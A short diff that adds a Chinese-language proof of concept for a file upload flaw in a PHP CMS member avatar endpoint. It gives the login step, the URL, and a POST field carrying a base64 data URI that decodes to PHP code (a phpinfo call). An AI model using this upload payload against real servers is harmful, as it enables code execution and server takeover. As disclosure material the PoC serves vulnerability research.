@@ -1,0 +1,6 @@
+注册会员，登录
+
+```
+访问：http://localhost:88/index.php?s=member&c=account&m=upload
+POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+
+```
